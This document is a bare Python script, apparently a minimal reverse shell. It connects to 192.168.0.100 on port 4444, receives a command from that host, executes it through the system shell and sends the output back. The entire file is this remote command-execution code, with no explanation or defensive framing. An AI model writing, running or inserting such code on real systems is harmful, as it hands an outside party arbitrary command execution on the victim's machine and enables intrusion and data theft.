#!/usr/bin/env python
import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.100", 4444))
i = s.recv(1024)
command = subprocess.check_output(i.decode('utf-8'), shell=True)
s.send(command)
s.close()